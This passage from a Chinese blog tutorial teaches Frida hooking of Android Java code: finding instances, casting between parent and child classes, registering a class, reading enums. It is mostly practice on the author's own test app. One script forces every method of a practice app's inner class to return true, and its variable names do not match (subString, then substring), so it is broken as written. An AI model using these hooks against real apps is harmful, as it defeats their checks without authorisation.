class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="comment">//console.log(&quot;args1, result&quot;, args1, result)</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args1), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.7.png" class=""><img src="/posts/ab7319a3/3.1.8.png" class=""><h2 id="3-2-构造对象"><a href="#3-2-构造对象" class="headerlink" title="3.2 构造对象"></a>3.2 构造对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Water.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Water</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">flow</span><span class="params">(Water w)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>,<span class="string">&quot;water flow:I&#x27;m flowing&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;water flow:I&#x27;m flowing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">still</span><span class="params">(Water w)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>,<span class="string">&quot;water still: still water runs deep!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;water still: still water runs deep!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//juice.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">juice</span> <span class="keyword">extends</span> <span class="title class_">Water</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fillEnergy</span><span class="params">()</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>, <span class="string">&quot;juice: I&#x27;m fillingEnergy&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Juice: I&#x27;m fillingEnergy&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mian</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Water</span> <span class="variable">w1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Water</span>();</span><br><span class="line">        flow(w1);</span><br><span class="line"></span><br><span class="line">        <span class="type">juice</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">juice</span>();<span class="comment">//子类对象可以使用父类的所有方法</span></span><br><span class="line">        flow(j);</span><br><span class="line"></span><br><span class="line">        <span class="type">Water</span> <span class="variable">w2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">juice</span>();</span><br><span class="line">        <span class="comment">//w2.fillEnergy();//错误，父类对象不能使用子类方法</span></span><br><span class="line">        ((juice) w2).fillEnergy();<span class="comment">//需要进行强制类型转换</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        com.v5le0n9.test02.juice.mian();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.2.1.png" class=""><p>那js也可以进行强制类型转换，也就是将一个父类对象转化成子类再使用子类方法吗？先找到父类对象的实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;water instance can still:&quot;</span>,instance.<span class="title function_">still</span>(instance))</span><br><span class="line">                <span class="title class_">Waterhandle</span> = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.v5le0n9.test02 -l test02.js</span><br></pre></td></tr></table></figure><p>乌鱼子，我怎么老hook不上。听说是跟App生命周期相关。</p><img src="/posts/ab7319a3/3.2.2.png" class=""><p>在知道对象的实例后，尝试在js中进行强制类型转换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;water instance can still:&quot;</span>,instance.<span class="title function_">still</span>(instance))</span><br><span class="line">                <span class="title class_">Waterhandle</span> = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> juicehandle = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="title class_">Waterhandle</span>,<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test02.juice&quot;</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;juice fillEnergy method:&quot;</span>, juicehandle.<span class="title function_">fillEnergy</span>())</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>结果说不行。</p><img src="/posts/ab7319a3/3.2.3.png" class=""><p>那子类对象可以转化成父类对象吗？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> juicehandle = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.juice&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>, instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;filling energy:&quot;</span>,instance.<span class="title function_">fillEnergy</span>())</span><br><span class="line">                juicehandle = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="title class_">Java</span>.<span class="title function_">cast</span>(juicehandle, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Water invoke still:&quot;</span>, <span class="title class_">Waterhandle</span>.<span class="title function_">still</span>(<span class="title class_">Waterhandle</span>))</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.2.4.png" class=""><p>综上，在js中父类转子类不行，而子类转父类可行。</p><h2 id="3-3-利用接口构造类和方法"><a href="#3-3-利用接口构造类和方法" class="headerlink" title="3.3 利用接口构造类和方法"></a>3.3 利用接口构造类和方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//liquid.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">liquid</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">flow</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//milk.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">milk</span> <span class="keyword">implements</span> <span class="title class_">liquid</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">flow</span><span class="params">()</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;3interface&quot;</span>,<span class="string">&quot;flowing: interface&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">milk</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">milk</span>();</span><br><span class="line">        m.flow();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        milk.main();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.3.1.png" class=""><p>用js实现<code>milk.java</code>中的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> beer = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;com.v5le0n9.test02.beer&#x27;</span>,</span><br><span class="line">            <span class="attr">implements</span>: [<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.v5le0n9.test02.liquid&#x27;</span>)],</span><br><span class="line">            <span class="attr">methods</span>:&#123;</span><br><span class="line">                <span class="attr">flow</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;look I&#x27;m beer!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;taste good!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)    </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beer.flow:&quot;</span>,beer.$new().<span class="title function_">flow</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(main,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.3.2.png" class=""><h2 id="3-4-枚举"><a href="#3-4-枚举" class="headerlink" title="3.4 枚举"></a>3.4 枚举</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TrafficLight.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Signal</span>&#123;</span><br><span class="line">    GREEN,YELLOW,RED</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrafficLight</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Signal</span> <span class="variable">color</span> <span class="operator">=</span> Signal.RED;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//Log.d(&quot;4enum&quot;,&quot;enum&quot; + color.getClass().getName().toString());</span></span><br><span class="line">        Log.d(<span class="string">&quot;4enum&quot;</span>,<span class="string">&quot;enum&quot;</span> + color);</span><br><span class="line">        <span class="keyword">switch</span>(color)&#123;</span><br><span class="line">            <span class="keyword">case</span> RED:</span><br><span class="line">                color = Signal.GREEN;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> YELLOW:</span><br><span class="line">                color = Signal.RED;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> GREEN:</span><br><span class="line">                color = Signal.YELLOW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        TrafficLight.main();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.4.1.png" class=""><p>枚举可以看作一个类，可以使用js代码方式使用枚举的方法，比如将枚举的值列出用<code>getDeclaringClass()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Signal&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke getDeclaringClass:&quot;</span>,instance.<span class="title function_">getDeclaringClass</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Serach completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(main,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.4.2.png" class=""><p>当一个类中需要hook的方法较多，则可以使用枚举：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> class_name = <span class="string">&quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">InnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(class_name)</span><br><span class="line">        <span class="keyword">var</span> all_methods = <span class="title class_">InnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">        <span class="comment">//console.log(all_methods)</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;all_methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> method = all_methods[i]</span><br><span class="line">            <span class="comment">//console.log(method.toString())</span></span><br><span class="line">            <span class="keyword">var</span> subString = method.<span class="title function_">toString</span>().<span class="title function_">substr</span>(method.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(class_name)+class_name.<span class="property">length</span>+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">var</span> finalMethodString = substring.<span class="title function_">substr</span>(<span class="number">0</span>,substring.<span class="title function_">indexOf</span>(<span class="string">&quot;(&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(finalMethodString)</span><br><span class="line">            <span class="title class_">InnerClass</span>[finalMethodString].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-5-Map"><a href="#3-5-Map" class="headerlink" title="3.5 Map"></a>3.5 Map</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> 